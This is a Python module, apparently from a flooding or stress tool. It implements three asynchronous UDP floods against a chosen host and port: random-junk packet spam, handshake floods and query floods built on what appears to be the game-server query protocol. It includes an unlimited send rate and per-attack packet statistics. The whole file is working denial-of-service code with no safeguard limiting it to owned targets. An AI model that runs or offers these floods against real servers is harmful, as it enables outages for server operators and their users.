import asyncio
import os
import random
import socket
import time

from core.levels import Stats
from utils import ok

SO_SNDBUF_TARGET = 4 * 1024 * 1024


def _query_handshake(session_id):
    return b"\xFE\xFD\x09" + session_id.to_bytes(4, "big")


def _query_stat(session_id):
    return (
        b"\xFE\xFD\x00"
        + session_id.to_bytes(4, "big")
        + b"\x00\x00\x00\x00"
        + b"\x00\x00\x00\x00"
    )


def _spam_payload():
    return [os.urandom(random.randint(1024, 1400))]


def _handshake_payload():
    return [_query_handshake(random.randint(0, 0xFFFFFFFF))]


def _query_payloads():
    sid = random.randint(0, 0xFFFFFFFF)
    return [_query_handshake(sid), _query_stat(sid)]


async def _udp_run(host, port, duration, rate, payload_fn, tag):
    mode = "unlimited" if rate <= 0 else f"{rate}/s"
    ok(f"[{tag}] start target={host}:{port} dur={duration}s rate={mode}")
    end = time.perf_counter() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SO_SNDBUF_TARGET)
    except OSError:
        pass

    stats = Stats()
    interval = (1.0 / rate) if rate > 0 else 0.0
    next_tick = time.perf_counter()
    try:
        while time.perf_counter() < end:
            for pkt in payload_fn():
                try:
                    sock.sendto(pkt, (host, port))
                    stats.sent += 1
                    stats.bytes_out += len(pkt)
                except OSError:
                    stats.fails += 1
            if rate <= 0:
                await asyncio.sleep(0)
            else:
                next_tick += interval
                now = time.perf_counter()
                if next_tick > now:
                    await asyncio.sleep(next_tick - now)
                else:
                    await asyncio.sleep(0)
    finally:
        try:
            sock.close()
        except OSError:
            pass
    stats.report(tag, "pps")


async def udp_spam(host, port, duration, rate=50):
    await _udp_run(host, port, duration, rate, _spam_payload, "UDP-SPAM")


async def udp_handshake_flood(host, port, duration, rate=50):
    await _udp_run(host, port, duration, rate, _handshake_payload, "UDP-HANDSHAKE")


async def udp_query_flood(host, port, duration, rate=50):
    await _udp_run(host, port, duration, rate, _query_payloads, "UDP-QUERY")
